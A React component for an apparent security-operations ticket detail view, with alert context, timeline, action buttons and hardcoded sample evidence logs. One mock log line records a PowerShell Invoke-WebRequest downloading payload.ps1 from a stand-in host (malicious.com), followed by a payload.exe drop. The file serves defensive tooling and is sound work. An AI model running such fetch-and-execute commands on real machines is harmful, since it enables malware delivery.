import React from 'react';
import { useNavigate } from 'react-router-dom';
import TicketLifecycleTimeline from './TicketLifecycleTimeline';
import AnalystActivityLog from './AnalystActivityLog';
import CaseIntelligencePanel from './CaseIntelligencePanel';
import './TicketingOrchestration.css';

export default function TicketDetail({ ticket, onBack }) {
    const navigate = useNavigate();

    const handleInvestigateAlert = () => {
        navigate('/module/search', { state: { query: ticket.user } });
    };

    const handleCorrelateEvents = () => {
        navigate('/module/search', { state: { query: `user=${ticket.user} severity=Critical` } });
    };

    const handleTriggerPlaybook = () => {
        navigate('/module/response');
    };

    const handleViewAlert = () => {
        navigate('/module/alerts');
    };

    const getSLAClass = (sla) => {
        if (sla === 'Within SLA') return 'green';
        if (sla === 'Near Breach') return 'yellow';
        return 'red';
    };

    return (
        <div className="ticket-detail">
            <div className="detail-back-link" onClick={onBack}>
                ← Back to Tickets
            </div>

            {/* Header */}
            <div className="ticket-detail-header">
                <div className="ticket-detail-title">{ticket.title}</div>
                <div className="ticket-meta-row">
                    <span className="ticket-id">{ticket.id}</span>
                    <span className={`severity-badge ${ticket.severity.toLowerCase()}`}>
                        {ticket.severity}
                    </span>
                    <span className={`status-badge ${ticket.status.toLowerCase().replace(' ', '-')}`}>
                        {ticket.status}
                    </span>
                    <span className="ticket-meta-item">Created: {ticket.created}</span>
                    <span className="ticket-meta-item">Assigned to: {ticket.assignedTo}</span>
                    <div className={`sla-indicator ${getSLAClass(ticket.sla)}`}>
                        <div className="sla-dot"></div>
                        <span>{ticket.sla}</span>
                    </div>
                </div>
            </div>

            {/* Alert Context */}
            <div className="context-panel">
                <div style={{ fontSize: '14px', fontWeight: '700', marginBottom: '16px', color: '#1A1A1A' }}>
                    📊 Alert Context
                </div>
                <div className="context-grid">
                    <div className="context-item">
                        <span className="context-label">Alert ID</span>
                        <span className="context-value monospace">{ticket.alertId}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">Source System</span>
                        <span className="context-value">{ticket.sourceSystem}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">Confidence Score</span>
                        <span className="context-value" style={{ color: '#2EB67D' }}>{ticket.confidence}%</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">MITRE ATT&CK</span>
                        <span className="context-value monospace">{ticket.mitre}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">User / Entity</span>
                        <span className="context-value monospace">{ticket.user}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">Asset</span>
                        <span className="context-value">{ticket.asset}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">Asset Criticality</span>
                        <span className="context-value">{ticket.assetCriticality}</span>
                    </div>
                    <div className="context-item">
                        <span className="context-label">Timestamp</span>
                        <span className="context-value">{ticket.timestamp}</span>
                    </div>
                </div>
            </div>

            {/* Lifecycle Timeline */}
            <TicketLifecycleTimeline currentStage={ticket.currentStage} />

            {/* Analyst Activity Log */}
            <AnalystActivityLog />

            {/* AI Case Intelligence */}
            <CaseIntelligencePanel ticket={ticket} />

            {/* Evidence Section */}
            <div className="context-panel">
                <div style={{ fontSize: '14px', fontWeight: '700', marginBottom: '16px', color: '#1A1A1A' }}>
                    📎 Evidence Collected
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <div style={{
                        padding: '12px',
                        background: '#F7F9FA',
                        borderRadius: '4px',
                        fontSize: '12px',
                        fontFamily: 'Monaco, monospace'
                    }}>
                        <div style={{ color: '#6C757D', marginBottom: '4px' }}>Log Entry #1</div>
                        <div style={{ color: '#1A1A1A' }}>
                            2026-01-30 11:23:45 | LAPTOP-23 | PowerShell.exe | Command: Invoke-WebRequest -Uri http://malicious.com/payload.ps1
                        </div>
                    </div>
                    <div style={{
                        padding: '12px',
                        background: '#F7F9FA',
                        borderRadius: '4px',
                        fontSize: '12px',
                        fontFamily: 'Monaco, monospace'
                    }}>
                        <div style={{ color: '#6C757D', marginBottom: '4px' }}>Log Entry #2</div>
                        <div style={{ color: '#1A1A1A' }}>
                            2026-01-30 11:24:12 | LAPTOP-23 | Network Connection | Destination: 185.220.101.42:443
                        </div>
                    </div>
                    <div style={{
                        padding: '12px',
                        background: '#F7F9FA',
                        borderRadius: '4px',
                        fontSize: '12px',
                        fontFamily: 'Monaco, monospace'
                    }}>
                        <div style={{ color: '#6C757D', marginBottom: '4px' }}>Log Entry #3</div>
                        <div style={{ color: '#1A1A1A' }}>
                            2026-01-30 11:24:45 | LAPTOP-23 | File Created | C:\Users\john.smith\AppData\Local\Temp\payload.exe
                        </div>
                    </div>
                </div>
            </div>

            {/* Action Dock */}
            <div className="action-dock">
                <button className="action-btn" onClick={handleViewAlert}>
                    ⚠️ View Original Alert
                </button>
                <button className="action-btn" onClick={handleInvestigateAlert}>
                    🔍 Investigate Logs
                </button>
                <button className="action-btn">
                    📎 Add Evidence
                </button>
                <button className="action-btn" onClick={handleCorrelateEvents}>
                    🔗 Correlate Events
                </button>
                <button className="action-btn" onClick={handleTriggerPlaybook}>
                    ⚡ Trigger Playbook
                </button>
                <button className="action-btn">
                    📈 Escalate Ticket
                </button>
                <button className="action-btn">
                    👤 Assign Analyst
                </button>
                <button className="action-btn">
                    ✋ Request Approval
                </button>
                <button className="action-btn primary">
                    ✅ Close Ticket
                </button>
                <button className="action-btn">
                    📥 Export Audit Package
                </button>
            </div>
        </div>
    );
}
